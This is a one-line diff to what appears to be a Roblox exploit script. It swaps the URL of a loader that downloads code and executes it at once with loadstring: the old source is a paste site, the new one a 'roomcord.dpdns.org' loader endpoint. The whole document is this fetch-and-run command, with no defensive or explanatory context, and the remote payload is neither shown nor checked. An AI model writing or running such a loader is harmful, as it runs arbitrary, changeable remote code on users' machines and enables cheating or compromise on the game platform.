@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.pastes.dev/k5AgKSCMuA"))()
+loadstring(game:HttpGet("https://roomcord.dpdns.org/api/loader?id=0gnWDNDb"))()
